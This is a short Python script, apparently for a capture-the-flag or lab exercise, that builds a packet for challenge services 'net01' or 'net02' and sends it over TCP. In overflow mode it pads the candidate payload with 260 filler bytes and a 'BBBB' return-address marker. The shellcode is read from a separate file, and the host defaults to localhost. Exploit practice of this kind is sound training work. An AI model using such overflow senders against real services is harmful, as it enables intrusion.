from __future__ import annotations
import argparse, socket, struct
from collections import namedtuple
from pathlib import Path
Payload = namedtuple("Payload", "packet candidate_offset")
HEADER = struct.Struct("<4sBBH")
OVERFLOW_OFFSET = 260
def build_payload(challenge: str, mode: str, candidate: bytes) -> Payload:
    if challenge not in {"net01", "net02"} or mode not in {"probe", "overflow-context"}: raise ValueError("invalid challenge or mode")
    prefix = b"" if mode == "probe" else b"A" * OVERFLOW_OFFSET + b"BBBB"
    body = prefix + candidate
    if len(body) > 4096: raise ValueError("payload exceeds 4096 bytes")
    return Payload(HEADER.pack(b"BCN1" if challenge == "net01" else b"BCN2", 1, 1, len(body)) + body, HEADER.size + len(prefix))
def main() -> int:
    p=argparse.ArgumentParser(); p.add_argument("--challenge",choices=("net01","net02"),required=True); p.add_argument("--mode",choices=("probe","overflow-context"),default="probe"); p.add_argument("--candidate-file",type=Path,required=True); p.add_argument("--host",default="127.0.0.1"); p.add_argument("--port",type=int,required=True); p.add_argument("--timeout",type=float,default=3.0); a=p.parse_args()
    payload=build_payload(a.challenge,a.mode,a.candidate_file.read_bytes())
    with socket.create_connection((a.host,a.port),timeout=a.timeout) as s: s.sendall(payload.packet)
    return 0
if __name__ == "__main__": raise SystemExit(main())
